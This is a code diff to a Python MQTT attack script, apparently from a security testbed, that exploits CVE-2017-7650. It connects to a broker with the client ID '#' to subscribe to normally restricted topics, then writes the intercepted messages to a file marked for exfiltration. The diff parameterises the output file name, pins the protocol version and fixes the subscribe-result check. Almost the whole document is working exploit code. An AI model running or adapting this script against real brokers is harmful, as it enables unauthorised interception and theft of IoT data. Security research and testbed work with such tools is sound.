@@ -1,6 +1,5 @@
 import argparse
 import threading
-
 import mqtt_utilities as util
 import paho.mqtt.client as mqtt
 import time
@@ -11,11 +10,12 @@ def on_message(client, userdata, message):
         userdata["messages"].append(f"topic: {message.topic}  -  payload: {message.payload.decode()}\n")
 
 
-def main(username, password, topics, duration=10):
+def main(username, password, topics, file_name, duration=10):
     """In publisher exfiltration the attacker connects to the broker using '#' as client ID to exploit CVE-2017-7650 vulnerability and subscribe to normally inaccessible topics."""
     connection = util.Connection_status()
     data_dict = {"connection": connection, "messages": "", "lock": threading.Lock()}
-    client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2, client_id="#", userdata=data_dict)
+    client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2, client_id="#", userdata=data_dict,
+                         protocol=mqtt.MQTTv311)
     client.username_pw_set(username, password)
     client.on_connect = util.on_connect
     client.on_disconnect = util.on_disconnect
@@ -30,16 +30,19 @@ def main(username, password, topics, duration=10):
             successes = 0
             for topic in topics:
                 result = client.subscribe(topic, qos=2)
-                if result == mqtt.MQTT_ERR_SUCCESS:
+                if result[0] == mqtt.MQTT_ERR_SUCCESS:
                     print(f"Subscribed to topic: {topic}", flush=True)
                     successes += 1
                 else:
                     print(f"Failed to subscribe to topic: {topic}  -  Error code: {result}", flush=True)
             if successes == 0:
                 print(f"Failed to subscribe to any topic, ending script...", flush=True)
-                with open("to_be_exfiltrated_pub", "a") as f:
+                with open(file_name, "a") as f:
                     f.write("Attack Failed\n")
                 return
+            else:
+                with open(file_name, "a") as f:
+                    f.write("Beginning to receive data...\n")
             break
         else:
             if time.time() - start_time > duration:
@@ -53,7 +56,7 @@ def main(username, password, topics, duration=10):
     while elapsed_time < duration:
         time.sleep(10)
         with data_dict["lock"]:
-            with open("/to_be_exfiltrated_pub", "a") as f:
+            with open(file_name, "a") as f:
                 f.write(data_dict["messages"])
             data_dict["messages"] = ""
         elapsed_time = time.time() - start_time
@@ -68,6 +71,7 @@ if __name__ == "__main__":
     parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
     parser.add_argument("-u", "--username", type=str, help="username")
     parser.add_argument("-p", "--password", type=str, help="password")
+    parser.add_argument("-n", "--file-name", type=str, help="name for the file to gather exfiltrated data")
     parser.add_argument("-t", "--topics", type=str, nargs="*", help="topics to subscribe to")
     args = parser.parse_args()
-    main(args.username, args.password, args.topics, args.duration)
+    main(args.username, args.password, args.topics, args.file_name, args.duration)
